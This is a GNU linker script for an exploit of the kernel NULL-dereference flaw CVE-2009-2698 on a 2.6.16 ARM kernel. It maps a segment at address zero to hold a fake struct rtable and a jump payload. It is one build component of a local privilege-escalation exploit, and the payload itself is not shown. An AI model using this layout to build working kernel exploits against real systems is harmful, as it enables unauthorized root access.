/* Page-zero ELF for CVE-2009-2698 on the stock 2.6.16 ARM kernel.
 * The first PT_LOAD is at virtual address 0 and holds the fake struct
 * rtable (output at 0x74) and the jump payload at 0x80.  The code is
 * loaded at 0x10000, as in the earlier C implementation. */
ENTRY(_start)
PHDRS
{
  zero PT_LOAD FLAGS(6);
  text PT_LOAD FLAGS(5);
  rodata PT_LOAD FLAGS(4);
  data PT_LOAD FLAGS(6);
}
SECTIONS
{
  . = 0;
  .zero : { KEEP(*(.zero)) } :zero
  . = 0x10000;
  .text : { *(.text*) } :text
  .rodata : { *(.rodata*) } :rodata
  .data : { *(.data*) } :data
  .bss : { *(.bss*) *(COMMON) } :data
  /DISCARD/ : { *(.comment) *(.note*) *(.eh_frame*) *(.ARM.exidx*) }
}
